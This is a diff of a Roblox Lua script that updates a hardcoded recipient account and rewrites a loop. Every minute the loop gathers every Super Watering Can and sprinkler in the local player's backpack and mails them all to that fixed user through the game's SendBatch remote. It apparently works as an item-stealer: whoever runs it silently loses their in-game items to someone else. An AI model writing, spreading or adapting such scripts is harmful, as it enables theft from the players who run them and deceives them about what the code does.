@@ -8,8 +8,10 @@ local Networking = require(ReplicatedStorage.SharedModules.Networking)
 -- CONFIG
 --------------------------------------------------
 
-local USERNAME = "sangjukie"
-local INTERVAL = 15
+local USERNAME = "otmoonbloom1"
+
+local CHECK_INTERVAL = 60
+local MIN_WATERING_CAN = 2
 
 --------------------------------------------------
 -- GET USER ID
@@ -20,99 +22,152 @@ local Success, UserId = pcall(function()
 end)
 
 if not Success then
+	warn("Gagal mendapatkan UserId.")
 	return
 end
 
 --------------------------------------------------
--- CHECK ITEM
+-- GET ITEM COUNT
 --------------------------------------------------
 
-local function HasItem(ItemName)
+local function GetItemCount(ItemName)
 	local Backpack = LocalPlayer:FindFirstChild("Backpack")
-	local Character = LocalPlayer.Character
 
-	return (Backpack and Backpack:FindFirstChild(ItemName))
-		or (Character and Character:FindFirstChild(ItemName))
+	if not Backpack then
+		return 0
+	end
+
+	local Item = Backpack:FindFirstChild(ItemName)
+
+	if not Item then
+		return 0
+	end
+
+	local Count = Item:GetAttribute("Count")
+
+	if typeof(Count) == "number" then
+		return Count
+	end
+
+	return 0
 end
 
 --------------------------------------------------
--- LOOP GIFT
+-- ITEM CONFIG
 --------------------------------------------------
 
-while task.wait(INTERVAL) do
+local Items = {
+	{
+		Category = "WateringCans",
+		ItemKey = "Super Watering Can"
+	},
 
-	if HasItem("Super Sprinkler") then
-		pcall(function()
-			Networking.Mailbox.SendBatch:Fire(
-				UserId,
-				{
-					{
-						Category = "Sprinklers",
-						ItemKey = "Super Sprinkler",
-						Count = 2
-					}
-				},
-				"Supersprinkler"
-			)
-		end)
+	{
+		Category = "Sprinklers",
+		ItemKey = "Super Sprinkler"
+	},
+
+	{
+		Category = "Sprinklers",
+		ItemKey = "Legendary Sprinkler"
+	},
+
+	{
+		Category = "Sprinklers",
+		ItemKey = "Rare Sprinkler"
+	},
+
+	{
+		Category = "Sprinklers",
+		ItemKey = "Uncommon Sprinkler"
+	},
+
+	{
+		Category = "Sprinklers",
+		ItemKey = "Common Sprinkler"
+	}
+}
+
+--------------------------------------------------
+-- TRADE FUNCTION
+--------------------------------------------------
+
+local function TryTrade()
+
+	--------------------------------------------------
+	-- CHECK SUPER WATERING CAN
+	--------------------------------------------------
+
+	local WateringCanCount = GetItemCount("Super Watering Can")
+
+	if WateringCanCount < MIN_WATERING_CAN then
+		return
 	end
 
+	--------------------------------------------------
+	-- BUILD TRADE LIST
+	--------------------------------------------------
 
-	if HasItem("Legendary Sprinkler") then
-		pcall(function()
-			Networking.Mailbox.SendBatch:Fire(
-				UserId,
-				{
-					{
-						Category = "Sprinklers",
-						ItemKey = "Legendary Sprinkler",
-						Count = 2
-					}
-				},
-				"Supersprinkler"
-			)
-		end)
+	local TradeItems = {}
+
+	for _, ItemData in ipairs(Items) do
+
+		local Count = GetItemCount(ItemData.ItemKey)
+
+		if Count > 0 then
+			table.insert(TradeItems, {
+				Category = ItemData.Category,
+				ItemKey = ItemData.ItemKey,
+				Count = Count
+			})
+		end
+
 	end
 
+	--------------------------------------------------
+	-- CHECK TRADE LIST
+	--------------------------------------------------
 
-		if HasItem("Star Fruit") then
-		pcall(function()
-			Networking.Mailbox.SendBatch:Fire(
-				UserId,
-				{
-					{
-						Category = "Seeds",
-						ItemKey = "Star Fruit",
-						Count = 1
-					}
-				},
-				"StarFruit"
-			)
-		end)
+	if #TradeItems == 0 then
+		return
 	end
 
+	--------------------------------------------------
+	-- SEND ALL ITEMS
+	--------------------------------------------------
 
-	if HasItem("Super Watering Can") then
-		pcall(function()
-			Networking.Mailbox.SendBatch:Fire(
-				UserId,
-				{
-					{
-						Category = "WateringCans",
-						ItemKey = "Super Watering Can",
-						Count = 2
-					}
-				},
-				"SuperWateringCan"
-			)
-		end)
+	local SendSuccess, SendError = pcall(function()
+
+		Networking.Mailbox.SendBatch:Fire(
+			UserId,
+			TradeItems,
+			"rrr"
+		)
+
+	end)
+
+	if SendSuccess then
+		print(
+			"Trade berhasil. Super Watering Can:",
+			WateringCanCount
+		)
+	else
+		warn(
+			"Gagal mengirim:",
+			SendError
+		)
 	end
 
+end
 
+--------------------------------------------------
+-- CHECK INVENTORY EVERY 1 MINUTE
+--------------------------------------------------
 
+while true do
 
-	
+	TryTrade()
 
-
+	task.wait(CHECK_INTERVAL)
 
 end
